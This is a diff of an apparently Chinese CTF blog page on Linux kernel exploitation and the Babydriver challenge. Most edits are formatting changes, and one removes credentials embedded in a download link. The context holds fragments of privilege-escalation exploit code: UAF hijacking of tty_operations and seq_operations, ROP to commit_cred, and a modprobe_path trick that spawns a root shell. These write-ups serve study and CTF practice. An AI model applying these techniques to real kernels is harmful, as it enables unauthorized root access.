@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -287,7 +287,7 @@
 <li>通过系统调用号，跳转到全局变量<code>sys_table_table</code>相应的位置继续执行系统调用</li>
 </ol>
 <p>在<code>linux-4.4.7</code>，目录<code>arch/x86/entry/entry_64.S</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -406,11 +406,10 @@
 </span></span><span class="line"><span class="cl">	ja	1f				/* return -ENOSYS (already in pt_regs-&gt;ax) */
 </span></span><span class="line"><span class="cl">	movq	%r10, %rcx
 </span></span><span class="line"><span class="cl">	; 跳转到sys_call_table去执行
-</span></span><span class="line"><span class="cl">	call	*sys_call_table(, %rax, 8)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">	call	*sys_call_table(, %rax, 8)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>而<code>pt_regs</code>结构体的定义为在<code>arch\x86\include\asm\ptrace.h</code></p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -481,8 +480,7 @@
 </span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rsp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ss</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cm">/* top of stack page */</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到，在<code>rip</code>的上方，还有<code>cs</code>、<code>eflags</code>、<code>rsp</code>、<code>ss</code>。</p>
 <p>从内核态切换为用户态的流程为：</p>
@@ -495,13 +493,12 @@
 <ol>
 <li>
 <p>从内核镜像源，国内推荐<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/"target="_blank" rel="external nofollow noopener noreferrer">清华源<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>下载，如下载<code>linux-4.4.7</code>版本的内核：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v4.x/linux-4.4.7.tar.gz
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v4.x/linux-4.4.7.tar.gz</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -512,7 +509,7 @@
 </li>
 <li>
 <p><code>make menuconfig</code>，这里主要需要关注的是：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -523,8 +520,7 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Kernel hacking —-&gt; Kernel debugging
 </span></span><span class="line"><span class="cl">Kernel hacking —-&gt; Compile-time checks and compiler options —-&gt; Compile the kernel with debug info
 </span></span><span class="line"><span class="cl">Kernel hacking —-&gt; Generic Kernel Debugging Instruments —&gt; KGDB: kernel debugger
-</span></span><span class="line"><span class="cl">kernel hacking —-&gt; Compile the kernel with frame pointers
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">kernel hacking —-&gt; Compile the kernel with frame pointers</span></span></code></pre></td></tr></table>
 </div>
 </div><p>基本上不需要改动，直接保存退出即可。</p>
 </li>
@@ -544,7 +540,7 @@
 </li>
 <li>
 <p><code>make menuconfig</code>,主要关注：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -553,8 +549,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Settings -&gt; Build static binary (no shared libs)
 </span></span><span class="line"><span class="cl">Linux System Utilities -&gt; Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)
-</span></span><span class="line"><span class="cl">Networking Utilities -&gt; 取消选中 inetd
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Networking Utilities -&gt; 取消选中 inetd</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -565,7 +560,7 @@
 </li>
 </ol>
 <p>接下来做一些初始化操作：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -580,11 +575,10 @@
 </span></span><span class="line"><span class="cl">touch etc/inittab
 </span></span><span class="line"><span class="cl">mkdir etc/init.d
 </span></span><span class="line"><span class="cl">touch etc/init.d/rcS
-</span></span><span class="line"><span class="cl">chmod +x ./etc/init.d/rcS
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">chmod +x ./etc/init.d/rcS</span></span></code></pre></td></tr></table>
 </div>
 </div><p>配置<code>etc/inttab</code>:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -599,11 +593,10 @@
 </span></span><span class="line"><span class="cl">::ctrlaltdel:/sbin/reboot
 </span></span><span class="line"><span class="cl">::shutdown:/sbin/swapoff -a
 </span></span><span class="line"><span class="cl">::shutdown:/bin/umount -a -r
-</span></span><span class="line"><span class="cl">::restart:/sbin/init
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">::restart:/sbin/init</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在根目录下创建<code>init</code>文件：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -648,11 +641,10 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">umount /proc
 </span></span><span class="line"><span class="cl">umount /sys
-</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f</span></span></code></pre></td></tr></table>
 </div>
 </div><p>配置用户组：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -665,14 +657,13 @@
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ctf❌1000:1000:ctf:/home/ctf:/bin/sh&#34;</span> &gt;&gt; etc/passwd
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;root❌0:&#34;</span> &gt; etc/group
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ctf❌1000:&#34;</span> &gt;&gt; etc/group
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;none /dev/pts devpts gid=5,mode=620 0 0&#34;</span> &gt; etc/fstab
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;none /dev/pts devpts gid=5,mode=620 0 0&#34;</span> &gt; etc/fstab</span></span></code></pre></td></tr></table>
 </div>
 </div><p>配置动态链接库：</p>
 <p>直接按照主机系统拷贝过去即可。</p>
 <p>另外，在部署题目的时候，需要<code>insmod xxx.ko</code></p>
 <p>调试的时候，可以添加</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-10"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -681,8 +672,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">setsid /bin/cttyhack setuidgid 0 /bin/sh
 </span></span><span class="line"><span class="cl">cat /proc/kallsyms &gt; /tmp/kallsyms
-</span></span><span class="line"><span class="cl">cat /proc/modules &gt; /tmp/modules
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">cat /proc/modules &gt; /tmp/modules</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="babydriver">Babydriver</h2>
 <h3 id="基本信息">基本信息</h3>
@@ -716,7 +706,7 @@
 <li>子进程调用<code>system(&quot;/bin/sh&quot;)</code>即可获得<code>root</code>的<code>shell</code></li>
 </ul>
 <p>结构体为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-11"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -789,12 +779,11 @@
 </span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes):  168 */</span>
-</span></span><span class="line"><span class="cl">                         <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">                         <span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312232031701.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312232031701.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312232031701.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312232031701.png 2x" sizes="auto" data-title="image-20220312232031701" data-alt="image-20220312232031701" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><code>exp</code>为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-12"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -851,12 +840,11 @@
 </span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="uaf-tty_operations结构体利用">UAF tty_operations结构体利用</h4>
 <p>在<code>open(&quot;/dev/ptmx&quot;)</code>的时候，会分配到一个结构体<code>tty_struct</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-13"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -1309,11 +1297,10 @@
 </span></span><span class="line"><span class="cl"><span class="cm">/*  728      |     8 */</span>    <span class="k">struct</span> <span class="n">tty_port</span> <span class="o">*</span><span class="n">port</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes):  736 */</span>
-</span></span><span class="line"><span class="cl">                         <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">                         <span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>大小为<code>0x2e0</code>，在偏移为<code>24</code>的地方，有一个结构体<code>tty_operations</code>，存储着大量的函数指针：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-14"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1392,8 +1379,7 @@
 </span></span><span class="line"><span class="cl"><span class="cm">/*  264      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="o">*</span><span class="n">proc_fops</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes):  272 */</span>
-</span></span><span class="line"><span class="cl">                         <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">                         <span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>而对打开的<code>/dev/pmtx</code>设备进行读写的时候，最后会调用该结构体中的函数指针，以<code>write</code>为例，调用链为：</p>
 <ul>
@@ -1421,7 +1407,7 @@
 <li>关闭<code>smep</code>，执行<code>commit_cred(prepare_cred(0))</code>，然后回到用户态执行<code>system('/bin/sh')</code></li>
 </ul>
 <p><code>exp</code>如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-15"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1550,14 +1536,13 @@
 </span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">show_addr_u64</span><span class="p">(</span><span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">tty_fd</span><span class="p">,</span> <span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里使用了<code>mov rsp, rax ; dec ebx ; ret</code>是因为，在<code>call tty-&gt;ops-&gt;write</code>的时候，实际的汇编指令是<code>call [rax+0x38]</code></p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220313104929463.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220313104929463.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220313104929463.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220313104929463.png 2x" sizes="auto" data-title="image-20220313104929463" data-alt="image-20220313104929463" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>当然，由于只开启了<code>SMEP</code>而没有开启<code>SMAP</code>，因此可以在用户态的栈上去执行<code>commit_cred(prepare_cred(0))</code>，需要借助寄存器转移一下<code>rax</code>的值，并执行<code>call</code>语句而且返回。</p>
 <p>此时的<code>exp</code>为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-16"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1690,12 +1675,11 @@
 </span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">show_addr_u64</span><span class="p">(</span><span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">tty_fd</span><span class="p">,</span> <span class="n">fake_tty_struct</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="uaf-seq_operations结构体利用">UAF seq_operations结构体利用</h4>
 <p><code>seq_operations</code>的结构为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-17"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1710,14 +1694,13 @@
 </span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">next</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">pos</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">show</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>在<code>open(&quot;/proc/self/stat&quot;, 0)</code>的时候，会创建一个该结构体。然后，在<code>read(stat_fd, buf, size)</code>的时候，会调用<code>start</code>函数指针。所以，劫持该指针，有一次任意地址调用的机会，但是却没有办法控制其参数。</p>
 <p>该方法，需要结合<code>swapgs_restore_regs_and_return_to_usermode</code>函数，控制其<code>r15、r14、r13、r12、rbp、rbx</code>等参数，然后劫持<code>start</code>处为<code>add rsp, xxx; ret</code>即可有内核<code>rop</code>的机会，可以在内核执行<code>commit_cred(prepare_cred(0))</code>或者<code>commit_cred(&amp;init_cred)</code>，然后再栈迁移到用户态地址空间上，随后<code>swapgs</code>和<code>iretq</code>切回用户态执行<code>system('/bin/sh')</code>即可成功提权。不在用户态地址空间执行提权代码，是会遇到很神奇的问题；不在内核栈上切回用户态，是因为<code>rop</code>的长度可能不够。</p>
 <p>需要使用<code>add rsp, xxx; ret</code>，是因为，用户栈切换到内核栈的时候，会<code>push</code>所有的寄存器保存在内核栈上，而且处于高地址。所以可以把<code>rsp</code>往上抬，就可以访问到原来已在用户态赋值好的寄存器。</p>
 <p><code>exp</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-18"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1852,15 +1835,14 @@
 </span></span><span class="line"><span class="cl">        <span class="o">:</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">r15</span><span class="p">),</span> <span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">r14</span><span class="p">),</span> <span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">r13</span><span class="p">),</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">r12</span><span class="p">),</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">rbp</span><span class="p">),</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">rbx</span><span class="p">),</span> <span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">seq_fd</span><span class="p">),</span> <span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">r10</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="o">:</span> <span class="s">&#34;%rax&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>调试截图：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315005914468.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315005914468.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315005914468.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315005914468.png 2x" sizes="auto" data-title="image-20220315005914468" data-alt="image-20220315005914468" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315010005426.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315010005426.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315010005426.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315010005426.png 2x" sizes="auto" data-title="image-20220315010005426" data-alt="image-20220315010005426" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>最后完整的<code>exp</code>为：</p>
 <p><code>helpful.h</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-19"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -2809,11 +2791,10 @@
 </span></span><span class="line"><span class="cl">    <span class="nf">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;chmod +x %s&#34;</span><span class="p">,</span> <span class="n">modprobe_path</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/dummy&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>exp.c</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-20"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -3306,8 +3287,7 @@
 </span></span><span class="line"><span class="cl">    <span class="c1">// signal(SIGABRT, &amp;get_shell_ex);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// signal(SIGSEGV, &amp;get_shell_ex);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">exp_seq</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="引用与参考">引用与参考</h2>
 <p>1、<a href="https://roderickchan.github.io"target="_blank" rel="external nofollow noopener noreferrer">My Blog<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
